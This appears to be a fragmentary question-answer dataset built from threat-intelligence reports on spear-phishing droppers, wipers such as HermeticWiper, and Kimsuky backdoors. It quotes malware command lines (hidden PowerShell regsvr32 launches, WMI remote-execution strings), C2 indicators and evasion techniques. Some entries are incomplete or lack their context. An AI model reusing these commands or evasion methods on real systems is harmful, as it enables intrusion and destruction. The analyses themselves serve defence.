    "instruction": "Context: Malware Actors Using NIC Cyber Security Themed Spear Phishing to Target Indian Government Organizations\n1 month\nThis blog post describes an attack campaign where NIC ((<http://www.nic.in/>)National Informatics Centre) Cyber Security ago themed spear phishing email was used to possibly target Indian government organizations. In order to infect the victims, the attackers distributed spear-phishing email, which purports to have been sent from NIC's Incident response team, the attackers spoofed an email id that is associated with Indian Ministry of Defence to send out email to the victims. Attackers also used the name of the top NIC official in the signature of the email, this is to make it look like the email was sent by a high ranking Government official working at NIC (National Informatics Centre).\nBig Headline: Analysis of Word Document Containing Malicious Macro Code\nOnce the victim opens the attached word document it prompts the user to enable macro as shown below and the document also contains instruction on how to enable the macros.\nIf the victim enables the macro content, the malicious code drops the malware sample and exectutes it and it also shows a decoy document containing the instructions and guidelines related to cyber security. This is to make the user believe that is it indeed a document related to cyber security. Below are some of the screen shots showing the document that will shown to the user once the macro is enabled.\nThe malicious macro code was reverse engineered to understand its capabilities. The macro code is heavily obfuscated (uses obscure variable/function names to make analysis harder) as shown below.\nThe macro code first calls multiple functions to decode the executable content and then it drops the malicious executable (WINWORD.exe) in the Startup directory and then executes the dropped file as shown in the below screen shots.\nOnce the dropped file is executed by macro code it connects to the command and control server(c2 server) and to conceal the data sent by the malware, it communicates on port 443 (https) as shown below. The network traffic\npattern will be discussed in detail later.\nBig Headline: Analysis of the Dropped Executable (WINWORD.exe)\nThe dropped file was analyzed in an isolated environment (without actually allowing it to connect to the c2 server). This section contains the behavioral analysis of the dropped executable (WINWORD.exe).\nThe malware when executed creates additional files on the file system, It downloads these files by contacting the C2 server and saves it on the disk. Since the malware was not allowed to contact the C2 server its not clear about the functionality of these files. The below screen shots show WINWORD.exe creating an exectuable, VB script and VBE files. The malware uses WScript.exe to execute the VB scripts.\nAs mentioned above, malware once executed makes an https connection to the C2 server as shown below.\nBig Headline: C2 Communication Pattern\nUpon execution malware makes an https connection to the url hxxps://webmail[.]duia[.]in/webmail.php. The https connection was intercepted and different network communications were determined.\nIn the first communication it collects and sends the system information of the infected system to the attacker in the\nuser-agent field. The user-agent field contains information about the computer name, username and if the AntiVirus software is installed or not. The malware sends some information in the post data as well, the post data gives the information about the action that malware will perform. In the below screen shot notice the system information sent in the user-agent field and also from the post data it can be deduced that the malware downloads an exe file.\nMalware uses similar network communication pattern to download additional files (vbs, vbe, cmd, sc, ext, a3x etc). Once downloaded these files are saved in either \"%LocalAppData%\\Temp\\WindowsUpdates\" folder or in \"%Temp%\\WindowsUpdates\" folder. During analysis it was determined that the malware used these filenames (MS015-0012.exe, MS015-0012.vbs, MS015-0012.vbe etc.) to reside in these directories. Below screen shots shows some of the network communication made by the malware to download files.\nBig Headline: C2 Domain Information\nThis section contains details of the C2 domain (webmail[.]duia[.]in). Attackers used the DynamicDNS hostname\n(duia is a Dynamic DNS provider) to host the C2 server, this allows the attacker to quickly change the IP address in real time if the malware C2 server infrastructure is unavailable. The C2 domain currently resolves to an IP address shown below and the same domain was associated with another IP address previously. Both the IP addresses are associated with hosting providers as shown in the screen shot below\nBig Headline: Conclusion\nAttackers in this case made every attempt to launch a clever attack campaign by spoofing email address of Ministry of Defence, they also tried to trick the users to believe the email was sent from NIC's incident response team. To make the attack less suspicious they also used a legitimate PDF document in the attachment and used the name of the top NIC offical in the email signature. The attackers also hosted the C2 server in a Dynamic DNS provider network. We believe that such attacker groups are likely working to gain long-term access into Indian Government networks. With India rapidly moving towards digitization and cashless transactions we believe that more such cyber attacks will continue to target Government, Defence, NGOs and financial institutions. We have already reported this attack campaign and shared the associated indicators with the Indian CERT and NIC's Incident response team.\nFollow us on Twitter: (<https://twitter.com/monnappa22>)@monnappa22 (<https://twitter.com/cysinfo22>)@cysinfo22\n\nQuestion: Describe the communication pattern between the malware and the Command and Control (C2) server.

    "output": "The malware established an HTTPS connection to the C2 server at hxxps://webmail[.]duia[.]in/webmail.php. Upon execution, it collected and sent system information, including the computer name, username, and whether antivirus software was installed, via the user-agent field. The malware also sent post data indicating actions it would perform, such as downloading additional files. To conceal its activities, the malware communicated over port 443 (HTTPS), making it difficult to detect through standard network monitoring. The use of dynamic DNS for the C2 server allowed the attackers to quickly change the IP address if needed, further complicating detection and mitigation efforts.",

    "output": "Answer: The 'adbupd' backdoor used by PLATINUM achieves persistence through multiple methods, including the use of WMI/MOF compiled scripts. Its key functionalities include the ability to install itself under various names within the Program Files directory, support for plug-ins to modularize functionality, and the inclusion of the OpenSSL library to support encryption when sending or receiving data. It also contains functionality to run a copy of cmd.exe. These features help the backdoor evade detection by making it harder to identify a single installation pattern, allowing for flexible and extensible functionality through plug-ins, securing communications with encryption, and enabling command execution. The use of WMI/MOF scripts for persistence further complicates detection and removal efforts.",

    "instruction": "Context: Big Headline: The Deep Dive\nInitially we started investigating a sample reported to be associated with the incident to improve detection efficacy. Based off our analysis of e2ecec43da974db02f624ecadc94baf1d21fd1a5c4990c15863bb9929f781a0a we were able to link 0753f8a7ae38fdb830484d0d737f975884499b9335e70b7d22b7d4ab149c01b5 as a nearly identical sample. By the time we reached the network-related functions during our analysis, the relevant IP addresses belonging to the C2 servers were no longer responding back as expected. In order to capture the necessary traffic we had to modify both of the aforementioned disk wiper components. One modification replaced one of the hard-coded C2 server IP addresses with a local address belonging to a decoy VM while changing references to the other hard-coded addresses to point to this local address instead. The other modification simply changed the parameter being passed to an instance of the Sleep() function so debugging efforts wouldn't be put on hold for 45 minutes (the original sample used a 10 minutes sleep).\nWhen we initially examined a (<http://krebsonsecurity.com/2014/12/sony-breach-may-have-exposed-employee-healthcare-salary-data/comment-page-1/>)rule that was being distributed in the public we were looking for areas where we could improve coverage to better protect our customers. The new Wiper variant is poorly written code and luckily includes very little obfuscation.The author(s) made the mistake of allocating a buffer for the send() function that surpasses the data they wished to include in the payload: a null-terminated opening parentheses byte, the infected host's local IP address, and the first 15 bytes of the host name. This incorrect buffer allocation results in the desired data, in addition to some miscellaneous data already present on the stack (including the 0xFFFFFFFF bytes we alerted on in the first revision of our rule).\nSimply running the disk wiper component on different versions of Windows proves the miscellaneous data from the stack that we onced alerted on only applies to beacons being sent from Win XP hosts:\nBeacon payload from infected WinXP x86 VM:\nBeacon payload from infected Win7 x64 VM:\nWe have tested part of this hypothesis by running the malware on the same VMs when they had maximum length host names. The resulting beacons continued to limit the hostname bytes in the payload to 15 bytes. To confirm the entire hypothesis, we had to debug and step carefully through the instructions responsible for the data in these beacon payloads. You start by running the disk wiper component alone with the -w flag (which will naturally occur at some point when the disk wiper component is executed and copies itself to host three times). When you hit the following instruction\u2026\n\u2026we have to force execution of the alternate jump condition using the debugger to get to the next interesting chunk of assembly:\nWe eventually arrive to our function call in the code block following the (<https://en.wikipedia.org/wiki/Zero_flag>)ZF toggle. It's responsible for setting up the necessary socket and sending the beacon payload once a connection has been established:\nLater on, we reach a call within the current function (sub_402D10) that is purely responsible for sending the constructed payload:\nWhen we arrive at the following instruction\u2026\nThe code is just about to move 10 double words (ECX is currently 0x0A) from ESI (currently assigned to 0x415D60, which was on the stack prior to calling sub_402C80) to the stack itself (starting at EDI, currently assigned stack pointer 0x12F4CE).\nFinally, we reach the call to the Windows function send():\nNow, at this point you're probably thinking, \"Cool. You explained how the payload is ultimately sent out, but how does this explain the random bytes in the payload?\". Glad you asked\u2026\nShortly after the instruction where you had to manually toggle the ZF but prior to sub_402D10, there's a call to a function that fetches the name of the infected host:\nThe first block of instructions belonging to this function is shown below:\nWhen you get to the following instruction in that block\u2026\n\u2026ECX = 0x08, ESI = 0x14F8D4, & EDI = 0x415D64. This means that eight double words will be extracted starting at the pointer in ESI and moved to the pointer in EDI. Guess what's on the stack right now?:\nThe data from these eight stack frames will get moved to the .data section, starting at 0x415D64. You'll get the four \"prefix bytes\" added on once the local IP address is acquired from that same code block via:\nAnd, as we've already detailed earlier, 0x2800 will be added as final prefix bytes to the resulting payload. But, we now have another hard-coded element we can alert on in the beacon payload:\nThe third instruction shown above will store 0x04 as a doubleword to 0x415D84, which just happens to be at the very end of the payload currently stored in the .data section.\nWith this information, we were able to revise accordingly and design the following rule:\nClick for a text version. It is important to note that sid 32674 will continue to be improved in the future as the malware evolves. This blog applies to the variants we are aware of as of revision 2 of the signature.\nThis rule will alert on the samples we've analyzed thus far that send these beacons back to their respective C2 servers. What's more, the rule alerts on all of the hard-coded portions of the payload, providing more complete coverage regardless of the major Windows version running on these infected hosts.\nBig Headline: Conclusion\nWe always want to deliver up-to-date detection for the latest threats in the quickest most efficient manner possible. However, the quality of the detection should never be dismissed. The suggested rule we initially landed upon did cover these wiper components when run under select Windows environments, but our team wanted to fully understand the reasoning and justification behind every option of that rule. This helps us ensure we cover the threat to the best extent possible and do so in the most efficient way possible. Once we did we were able to analyze further and release coverage that was more robust for our customers to help prevent further compromises of this magnitude that may just utilize the Wiper malware family.\n\nQuestion: What steps did the authors take to confirm their hypothesis about the beacon payload construction, and what key elements did they identify in the payload that could be used for detection?\n\nAnswer:",
    "output": "To confirm their hypothesis, the authors ran the disk wiper component with the -w flag and used a debugger to step through the instructions responsible for the data in the beacon payloads. They identified that the payload included the local IP address, the first 15 bytes of the host name, and additional hard-coded elements like 0x04 as a doubleword at the end of the payload. By understanding the payload construction, they were able to revise their detection rule to alert on all hard-coded portions of the payload, providing more complete coverage regardless of the major Windows version running on infected hosts.",

To distribute the malicious excel file, the attackers registered a domain which impersonated the identity of most influential Indian think tank (<https://en.wikipedia.org/wiki/Institute_for_Defence_Studies_and_Analyses>)IDSA (Institute for Defence Studies and Analyses) and used the email id from the impersonating domain to send out the spear-phishing emails to the victims.\nMedium Headline: Anti-Analysis Techniques in the Malicious Excel File\nWhen the victim opens the attached excel file it prompts the user to enable macro content as shown in the below\nscreen shot.\nTo prevent viewing of the macro code and to make manual analysis harder attackers password protected the macro content as show below.\nEven though the macro is password protected, It is possible to extract macro code using analysis tools like (<https://www.decalage.info/python/oletools>)oletools. In this case oletools was used to extract the macro content but it turns out that the oletools was able to extract only partial macro content but it failed to extract the malicious content present inside a Textbox within the Userform. Below screen shot shows the macro content extracted by the oletools.\nThis extracted macro content was copied to new excel workbook and the environment was setup to debug the macro code. Debugging the macro code failed because the macro code accesses the textbox content within the UserForm (which oletools failed to extract). The technique of storing the malicious content inside the TextBox within the UserForm allowed the attackers to bypass analysis tools. Below screen shot shows the macro code accessing the content from the TextBox and the error triggered by the code due to the absence of the TextBox content.\nTo bypass the anti-analysis technique and to extract the content stored in the TextBox within the UserForm the password protection was bypassed which allowed to extract the content stored within the UserForm. Below screen shot shows the TextBox content stored within the UserForm.\nAt this point all the components (macro code and the UserForm content) required for analysis was extracted and an environment similar to the original excel file was created to debug the malicious macro. Below screen shots show the new excel file containing extracted macro code and the UserForm content.\nMedium Headline: Analysis of Malicious Excel File\nWhen the victim opens the excel file and enables the macro content, The malicious macro code within the excel file is executed. The macro code first generates a random filename as shown in the below screen shot.\nIt then reads the executable content stored in the TextBox within the UserForm and then writes the executable content to the randomly generate filename in the %AppData% directory. The executable is written in .NET framework\nThe content stored in the TexBox within the UserForm is an executable content in the decimal format. Below screen shot shows converted data from decimal to text. In this case the attackers used the TextBox within the UserForm to store the malicious executable content.\nBig Headline: Input:\nThe dropped file in the %AppData% directory is then executed as shown in the below screen shot.\nOnce the dropped file is executed it copies itself into %AppData%\\SQLite directory as SQLite.exe and executes as shown below.\nAs a result of executing SQLite.exe it makes a HTTP connection to the C2 server (qhavcloud[.]com). The C2 communication shown below contains a hard coded user-agent and the double slash (//) in the GET request this can be used to create network based signatures.\nSmall Headline: a) Malware Validates C2 Connection\nMalware checks if the executable is running as SQLite.exe from %AppData%\\SQLite directory, if not it copies itself as SQLite.exe to %AppData%\\SQLite directory as shown below.\nIt then launches the executable (SQLite.exe) with the command line arguments as shown in the below screen shots.\nMalware performs multiple checks to make sure that it is connecting to the correct C2 server before doing anything malicious. first its pings the C2 domain qhavcloud[.]com. Below screen shots show the ping to the C2 server.\nIf the ping succeeds then it determines if C2 server is alive by sending an HTTP request, it then reads the content from the C2 server and looks for a specific string \"Connection!\". If it does not find the string \"Connection!\" it assumes that C2 is not alive or it is connecting to the wrong C2 server. This technique allows the attackers to validate if they are connecting to the correct C2 server and also this technique does not reveal any malicious behavior in dynamic/sandbox analysis until the correct response is given to the malware. Below screen shots show the code that is performing the C2 connection and the validation.\nIf the ping does not succeed or if the C2 response does not contain the string \"Connection!\" then the malware gets\nthe list of backup C2 servers to connect by downloading a text file from the Google drive link. This technique of storing a text file containing the list of backup C2 servers on the legitimate site has advantages and it is highly unlikely to trigger any suspicion in security monitoring and also can bypass reputation based devices. Below screen shots show the code that downloads the text file and text file (info.txt) saved on the disk.\nDuring the time of analysis the text file downloaded from the Google drive link was populated with two private IP addresses, it looks like the attackers deliberately populated the IP addresses with two private IP addresses to prevent the researchers from determining actual IP/domain names of the backup C2 servers. Below screen shot shows the IP addresses in the text file.\nOnce the text file is downloaded the malware reads each and every IP address from the text file and performs the same C2 validation check (ping and checks for the string \"Connection!\" from the C2 response). Below screen shot shows the HTTP connection made to those IP addresses.\nSmall Headline: b) Malware Sends System Information\nBased on the analysis it was determined that the malware looks for a string \"Connection!\" in the C2 response, so the analysis environment was configured to respond with a string \"Connection!\" whenever the malware made a C2 connection. Below screen shot shows the C2 communication made by the malware and the expected response.\nOnce the malware validates the C2 connection then the malware creates an XML file (SQLite.xml) inside which it stores the user name and the password to communicate with the C2 server. Malware generates the user name to communicate with the C2 by concatenating a) the machine name, b) a random number between 1000 to 9999 and c) the product version of the file. Below screen shot shows the code that generates the user name\nMalware generates the password to communicate with the C2 by building an array of 16 random bytes, these random bytes are then encoded using base64 encoding algorithm and malware then replaces the characters \"+\" and\n\"/\" with \"-\" and \"_\" respectively from the encoded data. The attackers use the technique of replacing the standard characters with custom characters to makes it difficult to decode the string (containing the characters \"+\" and \"/\") using standard base64 algorithm.

This followed distributed denial-of-service (DDoS)(<https://www.politico.eu/article/minister-ukraine-websites-down-in-another-massive-online-attack/>) attacks against major Ukrainian websites and preceded the Russian military invasion by a few hours.\nThese destructive attacks leveraged at least three components:\nHermeticWiper: makes a system inoperable by corrupting its data\nHermeticWizard: spreads HermeticWiper across a local network via WMI and SMB\nHermeticRansom: ransomware written in Go\nHermeticWiper was observed on hundreds of systems in at least five Ukrainian organizations.\nOn February 24th, 2022, we detected yet another new wiper in a Ukrainian governmental network. We named it IsaacWiper and we are currently assessing its links, if any, with HermeticWiper. It is important to note that it was seen in an organization that was not affected by HermeticWiper.\nMedium Headline: Timeline\nHermeticWiper and HermeticWizard are signed by a code-signing certificate (shown in Figure 1) assigned to Hermetica Digital Ltd issued on April 13th, 2021. We requested the issuing CA (DigiCert) to revoke the certificate, which it did on February 24th, 2022.\nAccording to a (<https://www.reuters.com/world/europe/cyprus-games-writer-denies-links-malware-found-before-russian-invasion-2022-02-24/>)report by Reuters, it seems that this certificate was not stolen from Hermetica Digital. It is likely that instead the attackers impersonated the Cypriot company in order to get this certificate from DigiCert.\nESET researchers assess with high confidence that the affected organizations were compromised well in advance of the wiper's deployment. This is based on several facts:\nHermeticWiper PE compilation timestamps, the oldest being December 28th, 2021\nThe code-signing certificate issue date of April 13th, 2021\nDeployment of HermeticWiper through GPO in at least one instance suggests the attackers had prior access to one of that victim's Active Directory servers\nThe events are summarized in the timeline in Figure 2.\nMedium Headline: HermeticWiper\nThe initial access vector is currently unknown but we have observed artifacts of lateral movement inside the targeted organizations. In one entity, the wiper was deployed through the default domain policy (GPO), as shown by its path on the system:\nC:\\Windows\\system32\\GroupPolicy\\DataStore\\0\\sysvol\\<redacted>\\Policies\\{31B2F340-016D-11D2-945F00C04FB984F9}\\Machine\\cc.exe\nThis indicates that attackers likely took control of the Active Directory server.\nIn other instances, it is possible that (<https://github.com/SecureAuthCorp/impacket>)Impacket was used to deploy HermeticWiper. A Symantec (<https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia>)blogpost states that the wiper was deployed using the following command line:\ncmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1> \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2>&1\nThe last part is the same as the default behavior in Impacket's wmiexec.py, found on .\nFinally, a custom worm that we have named HermeticWizard was used to spread HermeticWiper across the compromised networks via SMB and WMI.\nMedium Headline: HermeticWiper\nHermeticWiper is a Windows executable with four drivers embedded in its resources. They are legitimate drivers from the EaseUS Partition Master software signed by CHENGDU YIWO Tech Development Co., and they implement low-level disk operations. The following files were observed:\n0E84AFF18D42FC691CB1104018F44403C325AD21: x64 driver\n379FF9236F0F72963920232F4A0782911A6BD7F7: x86 driver\n87BD9404A68035F8D70804A5159A37D1EB0A3568: x64 XP driver\nB33DD3EE12F9E6C150C964EA21147BF6B7F7AFA9: x86 XP driver\nDepending on the operating system version, one of those four drivers is chosen and dropped in C:\\Windows\\System32\\drivers\\<4 random letters>.sys. It is then loaded by creating a service.\nHermeticWiper then proceeds by disabling the Volume Shadow Copy Service (VSS) and wipes itself from disk by overwriting its own file with random bytes. This anti-forensic measure is likely intended to prevent the analysis of the wiper in a post-incident analysis.\nIt is interesting to note that most of the file operations are performed at a low level using DeviceIoControl calls.\nThe following locations are overwritten with random bytes generated by the Windows API function CryptGenRandom:\nThe master boot record (MBR)\nThe master file table (MFT)\n$Bitmap and $LogFile on all drives\nThe files containing the registry keys (NTUSER*)\nC:\\Windows\\System32\\winevt\\Logs\nIn addition, it also recursively wipes folders and files in Windows, Program Files, Program Files(x86), PerfLogs, Boot, System Volume Information, and AppData folders, using a FSCTL_MOVE_FILE operation. This technique appears to be quite unusual and very similar to what is implemented in the (<https://github.com/bleachbit/windows-wipe/blob/master/filewipe.py>)Windows Wipe project on GitHub (see the wipe_extent_by_defrag function). It also wipes symbolic links and big files in My Documents and Desktop folders by overwriting them with random bytes.\nFinally, the machine is restarted.

It is a DLL file developed in C++ that exports the functions DllInstall, DllRegisterServer, and DllUnregisterServer. Its export DLL name is Wizard.dll. It contains three resources, which are encrypted PE files:\nA sample of HermeticWiper (912342F1C840A42F6B74132F8A7C4FFE7D40FB77)\nexec_32.dll, responsible for spreading to other local computers via WMI (6B5958BFABFE7C731193ADB96880B225C8505B73)\nromance.dll, responsible for spreading to other local computers via SMB (AC5B6F16FC5115F0E2327A589246BA00B41439C2)\nThe resources are encrypted with a reverse XOR loop. Each block of four bytes is XORed with the previous block. Finally, the first block is XORed with a hardcoded value, 0x4A29B1A3.\nHermeticWizard is started using the command line regsvr32.exe /s /i <path>.\nFirst, HermeticWizard tries to find other machines on the local network. It gathers known local IP addresses using the following Windows functions:\nDNSGetCacheDataTable\nGetIpNetTable\nWNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY)\nNetServerEnum\nGetTcpTable\nGetAdaptersAddresses\nIt then tries to connect to those IP addresses (and only if they are local IP addresses) to see if they are still reachable. In case the -s argument was provided when HermeticWizard was started (regsvr32.exe /s /i:-s <path>), it also scans the full /24 range. So, if 192.168.1.5 was found in, for example, the DNS cache, it incrementally scans from 192.168.1.1 to 192.168.1.254. For each IP address, it tries to open a TCP connection on the following ports:\n20: ftp\n21: ftp\n22: ssh\n80: http\n135: rpc\n137: netbios\n139: smb\n443: https\n445: smb\nThe ports are scanned in a random order so it's not possible to fingerprint HermeticWizard traffic that way.\nWhen it has found a reachable machine, it drops the WMI spreader (detailed below) on disk and creates a new process with the command line rundll32 <current folder>\\<6 random letters>.ocx #1 -s <path to HermeticWizard> \u2013 i <target IP>.\nIt does the same with the SMB spreader (detailed below) that is also dropped in <current folder>\\<6 random letters>.ocx, but with different random letters.\nFinally, it drops HermeticWiper in <current folder>\\<6 random letters>.ocx and executes it.\nMedium Headline: WMI spreader\nThe WMI spreader, named by its developers exec_32.dll, takes two arguments:\n-i: The target IP address\n-s: The file to copy and execute on the target machine\nFirst, it creates a connection to the remote ADMIN$ share of the target using WNetAddConnection2W. The file provided in the -s argument is then copied using CopyFileW. The remote file has a random name generated with CoCreateGUID (e.g., cB9F06408D8D2.dll) and the string format c%02X%02X%02X%02X%02X%02X.\nSecond, it tries to execute the copied file, HermeticWizard, on the remote machine using DCOM. It calls CoCreateInstance with CLSID_WbemLocator as argument. It then uses WMI Win32_Process to create a new process on the remote machine, with the command line C:\\windows\\system32\\cmd.exe /c start C:\\windows\\system32\\\\regsvr32.exe /s /i C:\\windows\\<filename>.dll.\nNote that the -s argument is not passed to HermeticWizard, meaning that it won't scan the local network again from this newly compromised machine.\nIf the WMI technique fails, it tries to create a service using OpenRemoteServiceManager with the same command as above.\nIf it succeeds in executing the remote DLL in any way, it sleeps until it can delete the remote file.\n\nWhat role did the code-signing certificate play in the deployment of HermeticWiper and HermeticWizard, and how was its legitimacy compromised?",
    "output": "A: The code-signing certificate, assigned to Hermetica Digital Ltd and issued on April 13th, 2021, was used to sign both HermeticWiper and HermeticWizard. This certificate gave the malware an appearance of legitimacy, making it less likely to be flagged by security systems. However, the certificate was not stolen from Hermetica Digital; instead, the attackers likely impersonated the Cypriot company to obtain the certificate from DigiCert. This allowed them to deploy the malware without raising immediate suspicion.",

The same person was ostensibly responsible for registering the two most recent domains (CBIUAEBN.COM and CBIUAEBANK. COM). Analysts from root9B now believe that the adversary most likely selected this name through an internet search, and that these personas, while possibly real names, are not the true names of those individuals associated with the preparations for this attack.\nroot9B analysts have also identified an additional persona; one that did not appear to directly relate to this attack against CBI UAE Bank, but that carried similar operational tactics to include comparable street address schemes and the registration of\ndomains closely resembling financial institutions. By studying the new persona, root9B discovered they had previously created several domains and websites, all of which have been flagged as Fake Financial Institutions by security analysts. Also identified during this analysis, was the prepositioning of a domain targeting the financial institution B-OFAMERIC.COM, created in April 2015.  This indicates that Bank of America, is among the probable targets.\nThis same individual has registered numerous other fake domains on many more name servers. One of these name servers, BULKBREAKERS.COM, contains several other international financial institutions.  One of those domains, T-D-CANADATRUST.COM, was updated on 23 March 2015, and appears to be targeting Toronto Dominion (TD) Canada Trust. Among the apparent targets of other domains similarly created or updated in 2015 are: the United Nations, United Nations Children's Fund, United Bank for Africa, Regions Bank, and possibly Commerzbank.\nBig Headline: Results\nWhile root9B's discovery began with servicing their own customers, their analysis has revealed an adversary pattern that has enabled the identification of previously unknown target vectors. As root9B analysts continued to peel back the layers, it became more apparent, that this attack was likely associated with Russian intelligence. The targets included multiple major financial institutions, as well as the international government domain. In addition to identifying targets, root9B analysts also discovered indicators of malware, the analysis of which revealed several zero-day threats and their corresponding \"hashes.\" Each new discovery revealed more information, enabling a more complete picture to emerge. root9B discovered and analyzed numerous other domains being staged or recently created for the malicious cyber operation. Also  discovered was a fatal flaw in the hackers tradecraft that lead to a major breakthrough. Research based on the adversary's flaw in tactics showed that there was a strong likelihood of two distinct subgroups, each of which utilized unique\nmethods of cover for their activity. Each of the two groups also had a unique theme to their target sets. The first seemed to focus on military, diplomatic, and media targets, and relied on the cover of proxies and private domain registrations. As documented earlier, the other group used deliberately falsified personalities, all of which claimed to be American citizens, and focused on financial and banking targets. Understanding the scope of the newly staged malicious operations, root9B also tipped the information to the appropriate international and domestic government authorities.\nWhile the continued vector of the attack remains unclear, root9B assesses that it will most likely be a spear-phishing campaign. This attack vector will likely use a well-crafted email containing either a malicious file or web hyperlink to what recipients believe is the actual website; but is instead a fake landing page. In typical attacks of this nature, once users navigate to the link, visitors are prompted to supply account credentials and personal information under the false assumption that they are communicating with their bank via a secure link. However, it is possible, that the Sofacy group could utilize this server as a vector to deliver malicious code to the banking victims in an attempt to obtain access to the network. As of October 2014, the Symantec Corporation had reported an increased use of spear-phishing emails containing malware specifically targeted against financial institutions.\nAccording to their conclusions, root9B analysts expect that spear-phishing attacks will begin in the near future, or may have already commenced.  As root9B continues to work with authorities it is recommended that the aforementioned financial institutions take caution examining any and all correspondence. In addition, it is recommended that networks begin blocking the following hashes and communications with the identified Command and Control (C2) server:\nMalware SHA1 Hash\n0450aaf8ed309ca6baf303837701b5b23aac6f05 bb909d9c27a509bf97cdc85268556ff5a6d2550a f325970fd24bb088f1befdae5788152329e26bf3 a351842ee01374d66bae35354ffe72f0b1b8a40b\nCommand and Control (C2) Server: 176.31.112.10\nInteresting samples of over 250 identified malicious domains*:\nb-of-americ.com osce-military.org bbcnewsweek.com qov.hu.com settings-yahoo.com yovtube.co googlesetting.com cbiuaebn.com cbiuaebank.com techcruncln.com un-unicef.org royalbsuk.com kwqx.us middle-eastreview.org unitednat.org fbonlinelottery.com fubnt.com globeshippers.biz globeshippers.net gsandsc.com gshippers.com hesselawchambers.com largefarm.net regionsbnk.info seatreasures.org ssandsc.com t-d-canadatrust.com techielawfirms.com togounoffice.com ubagroupsgh.com un-unicef.org unicomba.com universalcoba.com\n*Some domains may have been previously reported as associated with the Sofacy Group. It is root9B's opinion that new information regarding cybercrime targeting banks makes this information relevant.\nAnswer this question: How did root9B's analysis of the adversary's tactics reveal a broader pattern of targeting, and what were the key findings regarding the adversary's methods and potential attack vectors? How did root9B respond to these findings, and what recommendations did they provide to mitigate the threat?",

    "instruction": "Big Headline: CAUTION\nThis report contains a number of opinions given by the analysts based on the information that has been confirmed so far. Each analyst may have a different opinion and the content of this report may change without notice if new evidence is confirmed.\nTable of Contents\n1.1.\n1.2.\n1.3.\n1.3.1.\n1.3.2.\n3.\n3.1.3.\n3.3.1.\n4.\n5.1.1.\n5.1.2.\n5.1.3.\n5.1.4.\n5.2.1.\n5.3.\n5.4.\n5.4.3.\n5.5.1.\nOverview\nThis document is an analysis report on types of malware recently utilized by the Kimsuky group. The Kimsuky group is mainly known for launching social engineering attacks, such as spear phishing. Judging by the names of the attached files, the group seems to be targeting those working in the fields related to North Korea and foreign affairs. According to the scan logs of AhnLab's ASD infrastructure, the threat group has been mainly targeting individual users rather than companies, but has also been continuously attacking public institutions and companies. Korean universities have been one of their major targets, but records exist of them attacking IT, information and communications, and construction institutions as well.\nNormally, malware strains assumed to be attachments of spear phishing attack emails are disguised as document files. If a user executes the file, malware of this type executes the document that corresponds to the disguised file name and tricks the user into thinking that they have opened a normal file. It installs additional malware strains at the same time, mainly AppleSeed and PebbleDash. AppleSeed has been present since 2019 and when compared to other malware strains based on the IOCs organized by AhnLab, it takes up a significant portion due to being used in various other attacks. PebbleDash is one of the NukeSped variants, known for having been used by the Lazarus group since the past. Recently, it has been found that a new variant is being used for attacks along with AppleSeed.\nThey are both backdoors used by the Kimsuky group that can stay in the system and perform malicious behaviors by receiving commands from the attacker. The attacker can use backdoor to install another remote control malware, such as Meterpreter and HVNC. The attacker can also install various other types of malware for privilege escalation and account credential theft.\nThis report will analyze the overall flow of attacks using AppleSeed and PebbleDash, starting from malware strains that are initially distributed. As both malware types are not confined to a single form, this report will compare each type and focus on similarities and differences, and also explain in detail other types of malware that the two malware additionally install.\nBig Headline: 1. Distribution method\nLately, the Kimsuky group has been mainly distributing malware via spear phishing email attachments. Malware that creates AppleSeed or PebbleDash is usually disguised as a document file, such as pdf, docx, and hwp. These malware strains take a disguise of document files that discuss current affairs, such as diplomacy, defense, and COVID-19. However, the attacker does use other file types, such as jpg image or specific dat depending on the attack target. The files thought to be attached to spear phishing emails\u2014 the initial distribution files\u2014all have either an executable file or script format.\nThe script file is a wsf or js format malware, which creates and executes a normal document file that corresponds to the disguised name when it is run to make the user think that a normal document file has been opened. The executable is the same as the script file in terms of its distribution method and behaviors. One thing to note is that the file is distributed in PIF extensions.\nBoth the script and the executable show normal document files upon being executed and installed internally encoded malware into the system. When backdoors, such as AppleSeed or PebbleDash, are installed successfully, they can communicate with the C&C server afterward to steal information about the user environment or install additional malware.\nMedium Headline: 1.1. Script\nSamples distributed in the script form can all be executed immediately on Windows. Upon being executed, they create and run AppleSeed malware and normal document files. The confirmed samples take the form of JS or WSF file, as shown in Figure 1. They have different extensions but are functionally the same, as each is configured in the same JS code.\nThe samples can also be divided into two types depending on the method of code implementation. Figure 1 shows samples that declare function at the start because they have features, such as decoding, auto-delete, and file deletion, implemented as separate functions. Figure 2 shows another sample that makes no use of functions and starts with the try - catch statement.\nBoth types essentially perform the same behaviors. Decoding the Base64-encoded data yields AppleSeed malware and a normal document file. The malware creates two files in a particular path and executes them.\n- Command: powershell.exe -windowstyle hidden regsvr32.exe /s [AppleSeed malware path]\nFor Base64 decoding, the samples with functions use a method of running Powershell command, and samples that do not declare functions use certutil.exe to decode the file, as shown in Figure 3.\nSome samples may additionally access a particular URL as shown in Figure 4. It appears that the samples do so to report the infection status.\nThe name of the normal document file created in the process above is similar to the name of the distributed file with its content related to the file name.\nMedium Headline: 1.2. Executable File (pif)\nFor samples distributed in the PIF form, they create and execute malware and normal documents while performing additional malicious behaviors through mstha at the same time. This report will list the analysis information of the \"Progress Check_211013.pif (aa65c226335539c162a9246bcb7ec415) sample.\"\nWhen the malware is executed, it creates four threads, as shown in Table 1. Each thread has a specialized feature that is summarized in the following table.\nMost PIF droppers, including the analysis target sample, install VBS malware using mshta. However, some samples do not follow this pattern. Some samples lack the dropper feature that installs additional malware, while others install certain downloader malware types or malware that adds an RDP account.\nThere have also been samples with different internal code configurations that install PebbleDash backdoor instead of AppleSeed.\nSmall Headline: 1.2.2. Thread #2\nThread #2 thread creates and executes the normal document file to trick users into thinking that they have opened an innocuous document file, not a malware. It uses the same algorithm used in Thread #1 during the document creation process to decrypt the data. The normal document created usually uses a name similar to the filename of the distributed malware with contents related to the title.\nExamples of normal documents are shown in Figure 10. One thing to note is that the file with .h5 extensions use HDF (Hierarchical Data Format) file format, which is not widely used.\nSmall Headline: 1.2.4. Thread #4\nThe thread creates a BAT file with a random name in the %TEMP% directory and executes it via the CreateProcessW() function. The executed script, which is a command that deletes the created BAT file is shown below.\nThe main thread is configured to be terminated after all 